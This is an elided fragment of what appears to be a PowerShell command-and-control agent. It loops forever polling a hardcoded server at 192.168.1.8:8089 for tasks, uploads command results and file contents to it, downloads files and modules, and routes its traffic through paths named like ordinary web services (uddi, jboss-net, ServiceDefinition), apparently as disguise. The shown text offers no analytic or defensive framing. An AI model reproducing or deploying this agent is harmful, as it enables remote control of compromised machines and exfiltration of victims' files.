...
$output=$handle.UploadString("http://192.168.1.8:8089/operation/$agent", ":$content`:");
...
return $output
      ...
      function dn($filename){
            ...
            $handleh = $handle.Headers;
            $handleh.add("Content-Type", "application/x-www-form-urlencoded");
            $handle.UploadString("http://192.168.1.8:8089/webservice/$agent", "f:$filename&d:$content");
...
#echo $filename
#$t=(Invoke-WebRequest -UseBasicParsing -Uri http://192.168.1.8:8089/query/$filenameenc).Content

$req = [System.Net.WebRequest]::Create("http://192.168.1.8:8089/query/$filenameenc")
...
echo $data | Set-Content $filename -Encoding Byte
      ...
      function load($module)
      {
            ...
            $handleh = $handle.Headers;
            $handleh.add("Content-Type", "application/x-www-form-urlencoded");
            $enc=$handle.UploadString("http://192.168.1.8:8089/uddi/$agent", "$modulename");
...
$wc3 = new-object net.WebClient
      ...
      $key=$wc3.UploadString("http://192.168.1.8:8089/jboss-net/$agent",$finaldata)
$progressPreference = 'silentlyContinue';

$wc3 = New-Object system.Net.WebClient;
while($true){
#$t=(Invoke-WebRequest -UseBasicParsing -Uri http://192.168.1.8:8089/webserviceclient/$agent).Content
#$enc=[System.Text.Encoding]::UTF8.GetString($t)
$req = [System.Net.WebRequest]::Create("http://192.168.1.8:8089/webserviceclient/$agent")
$resp = $req.GetResponse()
$reqstream = $resp.GetResponseStream()
$stream = new-object System.IO.StreamReader $reqstream
...
$re = $wc3.UploadString("http://192.168.1.8:8089/ServiceDefinition/$agent",$redata);
